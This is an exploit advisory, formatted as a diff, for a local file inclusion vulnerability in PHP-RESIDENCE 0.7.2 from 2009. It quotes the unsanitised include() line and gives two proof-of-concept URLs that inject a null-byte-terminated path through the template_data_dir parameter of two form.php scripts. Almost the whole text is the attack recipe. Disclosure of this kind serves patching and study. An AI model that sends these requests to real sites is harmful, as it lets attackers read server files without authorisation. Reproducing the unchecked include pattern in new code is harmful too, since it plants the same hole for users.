@@ -1,0 +1,29 @@
+                            \#'#/
+                            (-.-)
+   --------------------oOO---(_)---OOo-------------------
+   | PHP-RESIDENCE <= 0.7.2 Multiple LFI Vulnerability  |
+   |      (works only with magic_quotes_gpc = off)      |
+   ------------------------------------------------------
+[!] Discovered: cr4wl3r <cr4wl3r[!]linuxmail.org>
+[!] Download: http://www.digitaldruid.net/download/php-residence_0.7.2.zip
+[!] Date: 30.12.2009
+[!] Remote: yes
+
+[!] Code :
+
+    include("./includes/templates/$template_data_dir/phrases.php");
+
+[!] PoC:
+
+    [PHP-RESIDENCE_path]/includes/templates/cal/form.php?template_data_dir=[LFI%00]
+
+
+
+
+[!] Code :
+
+    include("./includes/templates/$template_data_dir/phrases.php");
+
+[!] PoC:
+
+    [PHP-RESIDENCE_path]/includes/templates/rat/form.php?template_data_dir=[LFI%00]
